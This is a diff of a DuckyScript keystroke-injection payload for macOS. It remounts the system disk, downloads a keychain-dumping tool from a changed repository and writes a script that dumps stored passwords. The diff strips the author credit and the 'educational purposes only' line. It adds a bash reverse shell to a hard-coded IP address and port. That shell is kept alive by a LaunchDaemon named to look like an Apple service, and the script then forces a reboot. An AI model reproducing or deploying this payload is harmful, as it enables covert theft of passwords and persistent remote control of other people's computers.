@@ -1,7 +1,5 @@
-REM Isaiah Turner
 REM This tool will automatically dump all passwords stored in the keychain to a file on the desktop upon login.
-REM Please do not use this for evil, this is for educational purposes only.
-REM http://isaiahjturner.com
+
 DELAY 1000
 STRING mount -uw /
 ENTER
@@ -12,7 +10,7 @@ DELAY 200
 
 STRING echo '#!/bin/sh
 ENTER
-STRING curl -o /Library/.hidden/keychaindump 'https://raw.githubusercontent.com/IsaiahJTurner/keychaindump/master/keychaindump'
+STRING curl -o /Library/.hidden/keychaindump 'https://github.com/Rainierraoul/duckdump/raw/master/keychaindump'
 ENTER
 STRING chmod +x /Library/.hidden/keychaindump
 ENTER
@@ -27,13 +25,20 @@ ENTER
 STRING done' > /Library/.hidden/dump.sh
 ENTER
 DELAY 500
-
-
 STRING chmod +x /Library/.hidden/dump.sh
 ENTER
 DELAY 200
 
-
+STRING echo '#!/bin/bash
+ENTER
+STRING bash -i >& /dev/tcp/120.149.4.142/1988 0>&1
+ENTER
+STRING wait' > /Library/.hidden/connect.sh
+ENTER
+DELAY 500
+STRING chmod +x /Library/.hidden/connect.sh
+ENTER
+DELAY 200
 STRING mkdir /Library/LaunchDaemons
 ENTER
 DELAY 200
@@ -70,12 +75,52 @@ ENTER
 STRING </plist>' > /Library/LaunchDaemons/com.apples.services.plist
 ENTER
 DELAY 500
-
-
 STRING chmod 644 /Library/LaunchDaemons/com.apples.services.plist
 ENTER
 DELAY 200
-
-
 STRING launchctl load /Library/LaunchDaemons/com.apples.services.plist
 ENTER
+
+STRING echo '<plist version="1.0">
+ENTER
+STRING <dict>
+ENTER
+STRING <key>Label</key>
+ENTER
+STRING <string>com.apples.remoteservices</string>
+ENTER
+STRING <key>ProgramArguments</key>
+ENTER
+STRING <array>
+ENTER
+STRING <string>/bin/sh</string>
+ENTER
+STRING <string>/Library/.hidden/connect.sh</string>
+ENTER
+STRING </array>
+ENTER
+STRING <key>RunAtLoad</key>
+ENTER
+STRING <true/>
+ENTER
+STRING <key>StartInterval</key>
+ENTER
+STRING <integer>30</integer>
+ENTER
+STRING <key>AbandonProcessGroup</key>
+ENTER
+STRING <true/>
+ENTER
+STRING </dict>
+ENTER
+STRING </plist>' > /Library/LaunchDaemons/com.apples.remoteservices.plist
+ENTER
+DELAY 500
+STRING chmod 600 /Library/LaunchDaemons/com.apples.remoteservices.plist
+ENTER
+DELAY 200
+STRING launchctl load /Library/LaunchDaemons/com.apples.remoteservices.plist
+ENTER
+DELAY 1000
+
+STRING shutdown -r now
